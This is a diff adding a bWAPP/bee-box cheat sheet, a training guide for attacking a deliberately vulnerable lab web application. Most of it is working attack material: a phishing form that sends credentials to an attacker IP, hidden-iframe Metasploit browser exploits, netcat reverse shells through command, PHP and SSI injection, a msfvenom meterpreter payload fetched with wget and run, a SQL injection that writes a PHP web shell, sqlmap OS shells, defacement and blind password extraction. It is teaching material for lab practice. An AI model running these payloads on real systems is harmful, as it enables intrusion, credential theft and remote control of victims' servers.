@@ -1,0 +1,2857 @@
+
+-----------------------------
+bWAPP & bee-box - Cheat Sheet
+-----------------------------
+
+Hi little bees...
+
+Author				: Malik Mesellem, @MME_IT
+Date				: 18/10/2021
+bWAPP version			: bWAPP v2.2
+bee-box version 		: bee-box v1.6
+
+
+Remarks
+-------
+
+# We offer a 2-day exclusive web security course: Attacking & Defending Web Apps with bWAPP. More info: http://www.itsecgames.com
+# Don't hesitate to contact us if you would like to organize this training at your location.
+# We are always willing to speak about bWAPP on your security conference or convention, invite us!
+# Don't turn to the Dark Side, remember... a white hat superbee always wins! ;)
+
+
+Download locations
+------------------
+
+# bWAPP and bee-box VM
+
+URL: https://sourceforge.net/projects/bwapp/files/
+URL: https://sourceforge.net/projects/bwapp/files/bee-box/
+
+
+Possible setup scenario
+-----------------------
+
+client (local machine/victim)		: 10.0.1.50
+web server (bWAPP/bee-box)		: 10.0.1.51
+attacker (Kali Linux)			: 10.0.1.66
+
+
+Network configuration
+---------------------
+
+gedit /etc/network/interfaces &
+
+	auto eth0
+	# iface eth0 inet dhcp
+	iface eth0 inet static
+	address 10.0.1.xx
+	netmask 255.255.255.0
+	network 10.0.1.0
+	broadcast 10.0.1.255
+	gateway 10.0.1.254
+
+/etc/init.d/networking restart
+
+
+Host file
+---------
+
+# Modify the host file on the local machine/victim
+
+	10.0.1.51	bee-box.local
+	10.0.1.51	intranet.bee-box.local
+	10.0.1.66	attacker.local
+
+
+Postfix configuration
+---------------------
+
+# Reconfigure and restart Postfix on the bee-box
+
+sudo gedit /etc/postfix/main.cf
+
+	# Replace the hostname with the hostname of YOUR SMTP provider
+	relayhost = out.telenet.be
+
+sudo /etc/init.d/postfix restart
+
+
+-----------------
+HTTP/HTTPS Basics
+-----------------
+
+# Open a command shell on your bee-box
+
+Tool: netcat
+
+# Command line Kung Fu with netcat
+
+# GET method
+
+nc localhost 80
+GET /bWAPP/login.php HTTP/1.0
+
+
+# GET method, with host header
+
+nc localhost 80
+GET /bWAPP/login.php HTTP/1.1
+host: localhost
+
+
+# HEAD method
+
+nc localhost 80
+HEAD /bWAPP/login.php HTTP/1.0
+
+
+# OPTIONS method (1)
+
+nc localhost 80
+OPTIONS / HTTP/1.0
+
+
+# OPTIONS method (2)
+
+nc localhost 80
+OPTIONS /webdav/ HTTP/1.0
+
+
+# POST method, incorrect password
+
+nc localhost 80
+POST /bWAPP/login.php HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+login=bee&password=bugz&form=submit
+
+
+# POST method, correct password
+
+nc localhost 80
+POST /bWAPP/login.php HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+login=bee&password=bug&form=submit
+
+
+# GET method, no session cookie
+
+nc localhost 80
+GET /bWAPP/portal.php HTTP/1.0
+
+
+# GET method, incorrect session cookie
+
+nc localhost 80
+GET /bWAPP/portal.php HTTP/1.0
+Cookie: PHPSESSID=66666666666666666666666666666666;security_level=0
+
+
+# GET method, valid session
+
+nc localhost 80
+GET /bWAPP/portal.php HTTP/1.0
+Cookie: PHPSESSID=0f3ed63828e67b582b76af1d27bc7163;security_level=0
+
+
+-------------------------
+Building Web Applications
+-------------------------
+
+# Create an 'Evil Blog' web application
+
+# Explore the student materials
+# Go the 'blog' directory
+# Move the directory to the 'evil' directory on the bee-box
+
+sudo mv /home/bee/Desktop/blog/ /var/www/evil/
+
+# Go to http://attacker.local/evil/blog/
+
+# Play with HTML/JS/PHP/MySQL
+
+
+---------------------
+Database Technologies
+---------------------
+
+# Open a command shell on your bee-box
+
+mysql -u root -p
+show databases;
+use bWAPP;
+show tables;
+select * from users;
+select password from users;
+select password from users limit 0,1;
+select concat((select password from users limit 0,1),floor(rand(0)*2))x from information_schema.character_sets group by x;
+select count(*),concat((select password from users limit 0,1),floor(rand(0)*2))x from information_schema.character_sets group by x;
+
+
+--------------------------
+Introduction to Kali Linux
+--------------------------
+
+# login
+
+root/toor
+
+
+# Upgrade
+
+apt-get update
+apt-get dist-upgrade
+apt-get install gedit
+
+
+# Modify the host file
+
+gedit /etc/hosts
+
+	10.0.1.51	bee-box.local
+	10.0.1.51	intranet.bee-box.local
+
+
+# Layout settings
+
+# Go to System Settings > Region and Language > Layouts
+
+
+--------------
+Reconnaissance
+--------------
+--------
+Scanners
+--------
+
+Tool: Nmap
+
+# Optional, only for XML logging functionality
+
+cd /usr/share/nmap/
+mkdir scan-results
+cp nmap.xsl scan-results/
+
+
+# Help
+
+nmap -h
+
+
+# Basic scans
+
+nmap bee-box.local
+nmap bee-box.local -p-
+nmap bee-box.local -O
+nmap bee-box.local -sV
+nmap bee-box.local -sC
+nmap bee-box.local -A
+nmap bee-box.local -A -oA
+nmap bee-box.local -sV -O --script=[*]
+
+
+# Web server scans
+
+nmap bee-box.local -p 80,443
+nmap bee-box.local -p 80,443 -A
+nmap bee-box.local -p 80,443 -sV -O --script=[http-*]
+
+# Useful NSE scripts: ls /usr/share/nmap/scripts | grep -iE "http|sql|ssl"
+# http-apache-negotiation,http-backup-finder,http-brute.nse,http-comments-displayer,http-config-backup.nse,http-cors.nse,http-date,http-drupal-modules.nse,http-favicon.nse,http-headers,http-iis-webdav-vuln,http-joomla-brute.nse,http-malware-host,http-methods,http-phpmyadmin-dir-traversal.nse,http-php-version.nse,http-put.nse,http-robots.txt.nse,http-sql-injection.nse,http-stored-xss.nse,http-title.nse,http-trace.nse,http-waf-detect.nse,http-waf-fingerprint.nse,http-wordpress-enum.nse,ms-sql-brute.nse,ms-sql-config.nse,ms-sql-dump-hashes.nse,ms-sql-empty-password.nse,ms-sql-info.nse,ms-sql-xp-cmdshell.nse,mysql-audit.nse,mysql-brute.nse,mysql-dump-hashes.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse
+# More on NSE scripts: http://nmap.org/nsedoc/
+
+
+# More advanced web server scans
+
+nmap bee-box.local -p 80,443 -sV -O --reason -vv --open --script=http-apache-negotiation,http-backup-finder,http-date,http-headers,http-malware-host,http-methods,http-php-version,http-trace,sslv2
+nmap bee-box.local -p 80,443 -sV -O -oX ./scan-results/bWAPP.xml --stylesheet=nmap.xsl --reason -vv --open --script=http-apache-negotiation,http-backup-finder,http-brute.nse,http-comments-displayer,http-config-backup.nse,http-cors.nse,http-date,http-drupal-modules.nse,http-favicon.nse,http-headers,http-iis-webdav-vuln,http-joomla-brute.nse,http-malware-host,http-methods,http-phpmyadmin-dir-traversal.nse,http-php-version.nse,http-put.nse,http-robots.txt.nse,http-sql-injection.nse,http-stored-xss.nse,http-title.nse,http-trace.nse,http-waf-detect.nse,http-waf-fingerprint.nse,http-wordpress-enum.nse,ms-sql-brute.nse,ms-sql-config.nse,ms-sql-dump-hashes.nse,ms-sql-empty-password.nse,ms-sql-info.nse,ms-sql-xp-cmdshell.nse,mysql-audit.nse,mysql-brute.nse,mysql-dump-hashes.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,ssl-cert.nse,ssl-date.nse,ssl-enum-ciphers.nse,sslv2.nse
+nmap bee-box.local --script=http-phpself-xss --script-args http-phpself-xss.uri=/bWAPP/xss_php_self.php
+nmap bee-box.local --script=http-phpself-xss --script-args http-phpself-xss.uri=/evil/blog/index-1.php
+
+---
+
+Tool: nikto
+
+# Kali Linux
+
+nikto -host http://bee-box.local/bWAPP/
+
+
+# BackTrack
+
+cd /pentest/web/nikto
+perl nikto.pl -host http://bee-box.local/bWAPP/
+
+
+# Help
+
+nikto -Help
+
+
+# Update
+
+nikto -update
+
+
+# Print plugin and database versions
+
+nikto -Version
+
+
+# Config file location
+
+cat /etc/nikto.conf
+
+
+# Scans
+
+nikto -host http://bee-box.local/
+nikto -host https://bee-box.local/ -ssl
+nikto -host http://bee-box.local/bWAPP/
+nikto -host http://bee-box.local/bWAPP/ -output /root/Desktop/bWAPP -Format csv	# CSV format
+nikto -host http://bee-box.local/bWAPP/ -Display V	# Display verbose
+nikto -host http://bee-box.local/bWAPP/ -Tuning 4	# Scan only for injections (XSS/Script/HTML)  
+nikto -host http://bee-box.local/evil/blog/index-1.php -Tuning 4
+nikto -host http://bee-box.local/bWAPP/xss_php_self.php -Tuning 4
+
+
+# Add a custom check
+
+gedit /var/lib/nikto/databases/db_tests
+
+	"006609","0","b","/bWAPP/","GET","302","","","","","bWAPP, an extremely buggy web application, DETECTED!!!","",""
+
+	006609		: Nikto id
+	0 			: OSVDB id
+	b			: scan category (Software Identification)
+	"/bWAPP/"	: directory
+	"GET"		: Returned HTTP method
+	"302"		: Returned HTTP status code (redirection)
+
+
+# Create a custom user database
+
+cp /var/lib/nikto/databases/db_tests /var/lib/nikto/databases/udb_tests
+
+	#VERSION,1.000
+	# $Id: udb_tests 1 2013-10-16 00:00:00 Malik Mesellem $
+	#######################################################################
+	# Notes:
+	# Tuning options (field 3):
+	# 0 - File Upload
+	# 1 - Interesting File / Seen in logs
+	# 2 - Misconfiguration / Default File
+	# 3 - Information Disclosure
+	# 4 - Injection (XSS/Script/HTML)
+	# 5 - Remote File Retrieval - Inside Web Root
+	# 6 - Denial of Service
+	# 7 - Remote File Retrieval - Server Wide
+	# 8 - Command Execution / Remote Shell
+	# 9 - SQL Injection
+	# a - Authentication Bypass
+	# b - Software Identification
+	# c - Remote source inclusion
+	#######################################################################
+	"000001","0","b","/bWAPP/","GET","302","","","","","bWAPP, an extremely buggy web application, DETECTED!!!","",""
+	"000002","0","b","/evil/blog/","GET","200","","","","","An Evil Blog DETECTED!!!","",""
+
+nikto -host http://bee-box.local/ -Tuning b
+
+
+---------------
+Browser Add-ons
+---------------
+
+# A great collection add-ons for Firefox
+
+https://addons.mozilla.org/nl/firefox/collections/rsiles/samurai/
+
+Add-ons:
+
+	- Wappalyzer (Firefox)
+	- Tamper Data (Firefox)
+	- Cookie Manager+ (Firefox)
+	- User User Switcher (Firefox)
+
+
+------------------------------
+Vulnerabilities & Exploitation
+------------------------------
+--------------
+A1 - Injection
+--------------
+
+# External Links
+
+URL: https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005)
+URL: https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
+URL: http://ferruh.mavituna.com/sql-injection-cheatsheet-oku
+URL: https://www.golemtechnologies.com/articles/shell-injection
+
+
+HTML Injection - Reflected (GET)
+--------------------------------
+
+URL: http://bee-box.local/bWAPP/htmli_get.php
+
+<u>Bugged!</u>
+<h1>Bugged!</h1>
+<h1>Bugged by</h1><img src="http://www.mmeit.be/images/header_6.jpg"><!--
+
+
+HTML Injection - Stored (Blog)
+------------------------------
+
+URL: http://bee-box.local/bWAPP/htmli_stored.php
+
+<u>Bugged!</u>
+<h1>Bugged!</h1>
+<h1>Bugged by</h1><img src="http://www.mmeit.be/images/header_6.jpg"><!--
+<meta http-equiv="refresh" content="0; url=http://www.mmeit.be/">
+<div><iframe style="width: 100%; height: 100%" src="http://www.mmeit.be/en/"></iframe></div>
+
+
+# Injects a login form, redirecting the credentials to the attacker
+
+Tool: netcat
+
+nc -l -p 80
+
+<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;">Please login with valid credentials:<br><form name="login" action="http://10.0.1.66/login.htm"><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>
+
+
+# Injects a hidden iframe, pushing a Java exploit to the client
+
+<div><iframe style="visibility:hidden" src="http://10.0.1.66:8080/"></iframe></div>
+
+Tool: Metasploit
+
+msfconsole
+
+# Java exploit
+
+use exploit/multi/browser/java_rhino
+set LHOST 10.0.1.66
+set LPORT 666
+set URIPATH /
+exploit
+
+# IE exploit
+
+jobs -K
+use exploit/windows/browser/ms10_018_ie_behaviors
+set LHOST 10.0.1.66
+set LPORT 666
+set URIPATH /
+exploit
+
+
+LDAP Injection (Search)
+-----------------------
+
+URL: http://bee-box.local/bWAPP/ldapi.php
+
+*
+)(objectClass=*
+)(objectClass=computer
+
+
+Mail Header Injection (SMTP)
+----------------------------
+
+URL: http://bee-box.local/bWAPP/maili.php
+
+%0a (Linux)
+%0d%0a (Windows)
+
+# Modify the HTTP request using an intercepting proxy like ZAP
+
+bee@mailinator.com%0acc: evil_bee@mailinator.com
+bee@mailinator.com%0abcc: evil_bee@mailinator.com
+
+bee@mailinator.com%0d%0acc: evil_bee@mailinator.com
+bee@mailinator.com%0d%0abcc: evil_bee@mailinator.com
+
+# External Links
+
+http://www.phpsecure.info/v2/article/MailHeadersInject.en.php
+
+
+OS Command Injection
+--------------------
+
+URL: http://bee-box.local/bWAPP/commandi.php
+
+www.nsa.gov
+
+# Security level low
+
+;whoami
+;ls
+;ls ..
+;cat /etc/passwd
+
+# Security level medium
+
+| whoami
+| ls
+| ls ..
+| cat /etc/passwd
+
+
+# Makes a reverse shell connection to the attacker on port TCP/666
+
+Tool: netcat
+
+nc -l -p 666
+;nc 10.0.1.66 666 -e /bin/bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo "Bugged!" > /var/www/bWAPP/documents/bee_cmdi.htm
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_cmdi.htm
+
+
+# Automated OS Command Injection
+
+Tool: commix (Automated All-in-One OS Command Injection and Exploitation Tool)
+
+# Without session ID
+
+commix --url="http://bee-box.local/bWAPP/commandi.php" --data=target="blah"
+
+# With session ID
+
+commix --url="http://bee-box.local/bWAPP/commandi.php" --data=target="blah" --cookie="PHPSESSID=eacec1a06a30627fe525d76fa330a66d;security_level=0"
+
+
+OS Command Injection - Blind
+----------------------------
+
+URL: http://bee-box.local/bWAPP/commandi_blind.php
+
+# Makes a Meterpreter reverse shell connection to the attacker on port TCP/666, using a non-writable bWAPP folder
+
+Tool: Metasploit (msfvenom & msfconsole)
+
+# Payload generation with msfvenom, base64 encoded, don't forget to edit the file: <?php ... ?>
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.1.66 LPORT=666 -e php/base64 -f raw > /root/Desktop/bee-shell.php
+
+# Start a Meterpreter listener
+
+msfconsole
+
+jobs -K
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 10.0.1.66
+set LPORT 666
+exploit
+
+# Start a web server
+
+cd /root/Desktop
+python -m SimpleHTTPServer 80
+
+# OS command injection string
+
+;wget -P /tmp http://10.0.1.66/bee-shell.php;php -r "include '/tmp/bee-shell.php';"
+
+
+# Automated OS Command Injection
+
+Tool: commix (Automated All-in-One OS Command Injection and Exploitation Tool)
+
+# Without session ID
+
+commix --url="http://bee-box.local/bWAPP/commandi.php" --data=target="blah"
+
+# With session ID
+
+commix --url="http://bee-box.local/bWAPP/commandi.php" --data=target="blah" --cookie="PHPSESSID=eacec1a06a30627fe525d76fa330a66d;security_level=0"
+
+
+PHP Code Injection
+------------------
+
+URL: http://bee-box.local/bWAPP/phpi.php
+
+http://bee-box.local/bWAPP/phpi.php?message=blah;system("whoami")
+
+
+# Makes a reverse shell connection to the attacker on port TCP/666
+
+Tool: netcat
+
+nc -l -p 666
+http://bee-box.local/bWAPP/phpi.php?message=blah;system("nc 10.0.1.66 666 -e /bin/bash")
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo "Bugged!" > /var/www/bWAPP/documents/bee_phpi.htm
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_phpi.htm
+
+
+Server-Side Includes (SSI) Injection
+------------------------------------
+
+URL: http://bee-box.local/bWAPP/ssii.php
+
+<!--#echo var="DOCUMENT_URI" -->
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#echo var="REMOTE_ADDR" -->
+
+<!--#exec cmd="ls" -->
+<!--#exec cmd="cat /etc/passwd" -->
+<!--#exec cmd="echo 'Bugged!' > /var/www/bWAPP/documents/bee_ssii.htm" -->
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_ssii.htm
+
+
+# Makes a reverse shell connection to the attacker on port TCP/666
+
+Tool: netcat
+
+nc -l -p 666
+<!--#exec cmd="nc 10.0.1.66 666 -e /bin/bash" -->
+python -c 'import pty;pty.spawn("/bin/bash")'
+whoami
+
+
+# External Links
+
+URL: https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection
+
+
+SQL Injection (GET/Search)
+--------------------------
+
+URL: http://bee-box.local/bWAPP/sqli_1.php
+
+'
+
+blah' or 1=1-- 
+blah' or 1=2-- 
+
+blah' union select 1-- 
+blah' union select 1,1,1,1,1,1,1-- 
+
+blah' union select 1,table_name,1,1,1,1,1 from information_schema.tables where table_schema=database()-- 
+
+blah' union select 1,column_name,1,1,1,1,1 from information_schema.columns where table_name='users' and table_schema=database()-- 
+blah' union select 1,login,password,email,secret,1,1 from users-- 
+
+blah' union select 1,column_name,1,1,1,1,1 from information_schema.columns where table_name='heroes' and table_schema=database()-- 
+blah' union select 1,login,password,secret,1,1,1 from heroes-- 
+
+
+# Other useful commands > Thanks to Twan (@TwanSec)
+
+blah' union select 1,version(),1,1,1,1,1-- 
+blah' union select 1,load_file("/etc/apache2/sites-available/default"),1,1,1,1,1-- 
+blah' union select 1,"test",1,1,1,1,1 into outfile "/var/www/bWAPP/documents/test.txt"-- 
+blah' union select 1,"<?php echo '<pre>';system($_REQUEST['cmd']);echo '</pre>'; ?>",1,1,1,1,1 into outfile "/var/www/bWAPP/documents/shell.php"-- 
+
+
+# Automated SQL injection
+
+Tool: sqlmap (https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+
+# BackTrack
+
+cd /pentest/database/sqlmap
+
+./sqlmap.py -u "http://bee-box.local/bWAPP/sqli_1.php?title=" --cookie="PHPSESSID=66666666666666666666666666666666;security_level=0" --dbs
+./sqlmap.py -u "http://bee-box.local/bWAPP/sqli_1.php?title=" --cookie="PHPSESSID=66666666666666666666666666666666;security_level=0" --current-user
+./sqlmap.py -u "http://bee-box.local/bWAPP/sqli_1.php?title=" --cookie="PHPSESSID=66666666666666666666666666666666;security_level=0" --users
+./sqlmap.py -u "http://bee-box.local/bWAPP/sqli_1.php?title=" --cookie="PHPSESSID=66666666666666666666666666666666;security_level=0" --password
+./sqlmap.py -u "http://bee-box.local/bWAPP/sqli_1.php?title=" --cookie="PHPSESSID=66666666666666666666666666666666;security_level=0" --dump
+
+./sqlmap.py -u "http://bee-box.local/bWAPP/sqli_1.php?title=" --cookie="PHPSESSID=66666666666666666666666666666666;security_level=0" -D bWAPP --tables
+./sqlmap.py -u "http://bee-box.local/bWAPP/sqli_1.php?title=" --cookie="PHPSESSID=66666666666666666666666666666666;security_level=0" -D bWAPP -T users --columns
+./sqlmap.py -u "http://bee-box.local/bWAPP/sqli_1.php?title=" --cookie="PHPSESSID=66666666666666666666666666666666;security_level=0" -D bWAPP -T users -C login,email,password,secret --dump
+
+./sqlmap.py -u "http://bee-box.local/bWAPP/sqli_1.php?title=" --cookie="PHPSESSID=66666666666666666666666666666666;security_level=0" --os-shell
+
+	3
+	/var/www/
+	/var/www/bWAPP/images/
+
+	whoami
+	ls
+	cd ../;ls
+	cd ../;echo "Bugged!" > /var/www/bWAPP/documents/bee_sqli.htm
+	cd ../;ls
+
+Defacement: http://bee-box.local/bWAPP/documents/bee_sqli.htm
+
+# Kali Linux
+
+sqlmap -u "http://bee-box.local/bWAPP/sqli_1.php?title=" --cookie="PHPSESSID=66666666666666666666666666666666;security_level=0" --dbs
+sqlmap -u "http://bee-box.local/bWAPP/sqli_1.php?title=" --cookie="PHPSESSID=66666666666666666666666666666666;security_level=0" --dump
+sqlmap -u "http://bee-box.local/bWAPP/sqli_1.php?title=" --cookie="PHPSESSID=66666666666666666666666666666666;security_level=0" --os-shell
+sqlmap -u "http://bee-box.local/bWAPP/sqli_1.php?title=" --cookie="PHPSESSID=66666666666666666666666666666666;security_level=0" --os-pwn
+
+# os-shell issue
+# Edit the file 'web.py' and add 2 times a 'break'
+
+gedit /usr/share/sqlmap/lib/takeover/web.py &
+
+if "sqlmap file uploader" in uplPage:
+	uploaded = True
+	break
+
+
+SQL Injection (GET/Select)
+--------------------------
+
+URL: http://bee-box.local/bWAPP/sqli_2.php
+
+http://bee-box.local/bWAPP/sqli_2.php?movie=1
+http://bee-box.local/bWAPP/sqli_2.php?movie=666
+http://bee-box.local/bWAPP/sqli_2.php?movie='
+
+http://bee-box.local/bWAPP/sqli_2.php?movie=666 or 1=1--
+http://bee-box.local/bWAPP/sqli_2.php?movie=666 or 1=2--
+
+
+SQL Injection (Login Form/Hero)
+-------------------------------
+
+URL: http://bee-box.local/bWAPP/sqli_3.php
+
+Valid credentials: alice/loveZombies (http://bee-box.local/bWAPP/config.inc)
+
+'
+
+alice'-- 
+
+blah' or 1=1-- 
+blah' or 'a'='a'-- 
+
+blah' union select 1,'admin',1,'Bugged!'-- 
+blah' union select 1,'admin',1,'<script>alert(0)</script>Bugged!'-- 
+
+
+SQL Injection (Login Form/User)
+-------------------------------
+
+URL: http://bee-box.local/bWAPP/sqli_16.php
+
+# SHA1 hash of blah: 5bf1fd927dfb8679496a2e6cf00cbe50c1c87145
+
+User: blah' union select 1,'admin','5bf1fd927dfb8679496a2e6cf00cbe50c1c87145','','Bugged!','',1,'',1-- 
+Pass: blah
+
+
+SQL Injection - Stored (Blog)
+-----------------------------
+
+URL: http://bee-box.local/bWAPP/sqli_7.php
+
+blah',(select password from heroes where login='neo'))-- 
+blah',(select password from mysql.user where user='root' limit 0,1))-- 
+
+
+SQL Injection - Stored (XML)
+----------------------------
+
+URL: http://bee-box.local/bWAPP/sqli_8.php
+
+# Error-based SQL injection > Thanks to Benjamin (@rotlogix, http://rotlogix.com/sql-injection-bwapp-storexml)
+
+<reset><login>blah' and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.character_sets group by x)a)+'</login><secret>Any bugs?</secret></reset>
+<reset><login>blah' and (select 1 from (select count(*),concat((select password from bWAPP.heroes limit 0,1),floor(rand(0)*2))x from information_schema.character_sets group by x)a)+'</login><secret>Any bugs?</secret></reset>
+<reset><login>blah' and (select 1 from (select count(*),concat(0x3a,(select mid((ifnull(cast(password as char),0x20)),1,50) from bWAPP.heroes limit 0,1),0x3a,floor(rand(0)*2))x from information_schema.character_sets group by x)a)+'</login><secret>Any bugs?</secret></reset>
+
+
+# Retrieves and stores Neo's password (trinity) as the secret (character by character)
+
+<reset><login>bee</login><secret>'+(select ascii(substring(password,1,1)) from heroes where login='neo')+'</secret></reset>
+<reset><login>bee</login><secret>'+(select ascii(substring(password,2,1)) from heroes where login='neo')+'</secret></reset>
+<reset><login>bee</login><secret>'+(select ascii(substring(password,3,1)) from heroes where login='neo')+'</secret></reset>
+<reset><login>bee</login><secret>'+(select ascii(substring(password,4,1)) from heroes where login='neo')+'</secret></reset>
+<reset><login>bee</login><secret>'+(select ascii(substring(password,5,1)) from heroes where login='neo')+'</secret></reset>
+<reset><login>bee</login><secret>'+(select ascii(substring(password,6,1)) from heroes where login='neo')+'</secret></reset>
+<reset><login>bee</login><secret>'+(select ascii(substring(password,7,1)) from heroes where login='neo')+'</secret></reset>
+
+
+# Time-based blind SQL injection
+
+<reset><login>bee</login><secret>'+(select 1 from heroes where login='neo' and ascii(substring(password,1,1))=116 and sleep(5))+'</secret></reset>
+<reset><login>bee</login><secret>'+(select 1 from heroes where login='neo' and ascii(substring(password,2,1))=114 and sleep(5))+'</secret></reset>
+<reset><login>bee</login><secret>'+(select 1 from heroes where login='neo' and ascii(substring(password,3,1))=105 and sleep(5))+'</secret></reset>
+<reset><login>bee</login><secret>'+(select 1 from heroes where login='neo' and ascii(substring(password,4,1))=110 and sleep(5))+'</secret></reset>
+<reset><login>bee</login><secret>'+(select 1 from heroes where login='neo' and ascii(substring(password,5,1))=105 and sleep(5))+'</secret></reset>
+<reset><login>bee</login><secret>'+(select 1 from heroes where login='neo' and ascii(substring(password,6,1))=116 and sleep(5))+'</secret></reset>
+<reset><login>bee</login><secret>'+(select 1 from heroes where login='neo' and ascii(substring(password,7,1))=121 and sleep(5))+'</secret></reset>
+
+
+SQL Injection - Blind - Boolean-Based
+-------------------------------------
+
+URL: http://bee-box.local/bWAPP/sqli_4.php
+
+iron man
+blah
+'
+
+
+# Boolean-based
+
+iron man' and 1=1-- 
+iron man' and 1=2-- 
+
+# Boolean-based, reveals Neo's password > trinity
+
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,1,1))=116-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,2,1))=114-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,3,1))=105-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,4,1))=110-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,5,1))=105-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,6,1))=116-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,7,1))=121-- 
+
+
+# Time-based
+
+iron man' and 1=1 and sleep(5)-- 
+iron man' and 1=2 and sleep(5)-- 
+
+# Time-based, reveals Neo's password > trinity
+
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,1,1))=116 and sleep(5)-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,2,1))=114 and sleep(5)-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,3,1))=105 and sleep(5)-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,4,1))=110 and sleep(5)-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,5,1))=105 and sleep(5)-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,6,1))=116 and sleep(5)-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,7,1))=121 and sleep(5)-- 
+
+
+# Automated SQL injection
+
+Tool: sqlmap (https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+
+# BackTrack
+
+cd /pentest/database/sqlmap
+
+./sqlmap.py -u "http://bee-box.local/bWAPP/sqli_4.php?title=iron+man" --cookie "PHPSESSID=66666666666666666666666666666666;security_level=0" --string "movie exists" --dump
+
+	n / n / N
+
+./sqlmap.py -u "http://bee-box.local/bWAPP/sqli_4.php?title=iron+man" --cookie "PHPSESSID=66666666666666666666666666666666;security_level=0" --os-shell
+
+	n / n / N
+	3
+	/var/www/
+	/var/www/bWAPP/images/
+
+# Kali Linux
+
+sqlmap -u "http://bee-box.local/bWAPP/sqli_4.php?title=iron+man" --cookie "PHPSESSID=66666666666666666666666666666666;security_level=0" --string "movie exists" --dump
+
+	n / n / N
+
+
+SQL Injection - Blind - Time-Based
+----------------------------------
+
+URL: http://bee-box.local/bWAPP/sqli_15.php
+
+# Time-based
+
+iron man' and 1=1 and sleep(5)-- 
+iron man' and 1=2 and sleep(5)-- 
+
+# Time-based, reveals Neo's password > trinity
+
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,1,1))=116 and sleep(5)-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,2,1))=114 and sleep(5)-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,3,1))=105 and sleep(5)-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,4,1))=110 and sleep(5)-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,5,1))=105 and sleep(5)-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,6,1))=116 and sleep(5)-- 
+blah' union select 1,1,1,1,1,1,1 from heroes where login='neo' and ascii(substring(password,7,1))=121 and sleep(5)-- 
+
+
+# Automated SQL injection
+
+Tool: sqlmap (https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+
+# Kali Linux
+
+sqlmap -u "http://bee-box.local/bWAPP/sqli_15.php?title=iron+man" --cookie "PHPSESSID=66666666666666666666666666666666;security_level=0" --dump
+
+
+SQL Injection - Blind (Web Services/SOAP)
+-----------------------------------------
+
+URL: http://bee-box.local/bWAPP/sqli_5.php
+
+# Boolean-based
+
+http://bee-box.local/bWAPP/sqli_5.php?title=Iron+Man'+and+1=1--+
+http://bee-box.local/bWAPP/sqli_5.php?title=Iron+Man'+and+1=2--+
+
+# Time-based
+
+http://bee-box.local/bWAPP/sqli_5.php?title=Iron+Man'+and+1=1+and+sleep(5)--+
+http://bee-box.local/bWAPP/sqli_5.php?title=Iron+Man'+and+1=2+and+sleep(5)--+
+
+
+XML/XPath Injection (Search)
+----------------------------
+
+URL: http://bee-box.local/bWAPP/xmli_2.php
+
+structure: http://bee-box.local/bWAPP/passwords/heroes.xml
+
+http://bee-box.local/bWAPP/xmli_2.php?genre=')]|//hero/login|//hero/password|//hero[contains(genre,'
+
+
+XML/XPath Injection (Login Form)
+--------------------------------
+
+URL: http://bee-box.local/bWAPP/xmli_1.php
+
+alice/loveZombies (http://bee-box.local/bWAPP/passwords/heroes.xml)
+
+'
+
+blah' or 1=1 or '
+blah' or 'a'='a' or '
+
+alice' or '
+alice' or 1=1 and '
+alice' or 'a'='a
+
+
+-----------------------------------------------
+A2 - Broken Authentication & Session Management
+-----------------------------------------------
+
+# The session cookie, PHPSESSID, is not secure
+# The HTTPOnly and the Secure flag are missing
+
+Broken Auth. - Password Attacks
+-------------------------------
+
+URL: http://bee-box.local/bWAPP/ba_pwd_attacks_1.php
+
+# Use a wordlist, in combination with an intercepting proxy
+# Check the size of the HTTP responses
+
